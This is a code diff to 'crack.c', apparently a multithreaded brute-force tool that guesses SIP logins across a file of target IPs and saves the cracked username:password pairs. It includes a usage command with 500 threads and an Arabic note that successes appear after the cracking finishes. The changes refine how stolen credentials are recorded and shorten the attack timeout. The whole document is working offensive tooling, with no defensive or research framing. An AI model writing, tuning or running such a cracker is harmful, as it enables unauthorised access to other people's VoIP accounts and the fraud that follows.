@@ -2,6 +2,7 @@ gcc crack.c -o crack -pthread
 ./crack --protocol 1 --threads 500 --targets 500 --targets-file ip.txt --user-pass-file User_Pass --success-file success.txt --reservation-file reservations.txt
 
 =====================================
+النتائج الناجحة تظهر بعد الانتهاء من الكراك تماما
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -221,14 +222,24 @@ void write_successful_attempts(const char* filename) {
         fprintf(file, "%s:%d ", successful_targets[i].ip, successful_targets[i].port);
 
         // Find corresponding credentials for the target
+        int found_credentials = 0;
         for (int j = 0; j < num_successful_credentials; j++) {
             if (strcmp(successful_credentials[j].username, successful_targets[i].ip) == 0 &&
                 atoi(successful_credentials[j].password) == successful_targets[i].port) {
                 // Write the username:password
-                fprintf(file, "%s:%s\n", successful_credentials[j].username, successful_credentials[j].password);
+                fprintf(file, "%s:%s", successful_credentials[j].username, successful_credentials[j].password);
+                found_credentials = 1;
                 break;
             }
         }
+
+        // If no credentials were found, write "N/A"
+        if (!found_credentials) {
+            fprintf(file, "N/A");
+        }
+
+        // Write newline after each target
+        fprintf(file, "\n");
     }
 
     fclose(file);
@@ -277,16 +288,16 @@ void sip_crack(Target* target, UserPass* user_pass) {
 
     printf("Running command: %s\n", command);
 
-    // Open the command as a pipe and read the output with a timeout of 10 seconds
+    // Open the command as a pipe and read the output with a timeout of 5 seconds
     FILE* pipe = popen(command, "r");
     if (!pipe) {
         perror("Failed to open pipe");
         return;
     }
 
-    // Set a timer for 10 seconds
+    // Set a timer for 5 seconds
     struct timeval timeout;
-    timeout.tv_sec = 10;
+    timeout.tv_sec = 5;
     timeout.tv_usec = 0;
 
     fd_set fds;
@@ -416,4 +427,3 @@ int main(int argc, char* argv[]) {
 
     return EXIT_SUCCESS;
 }
-
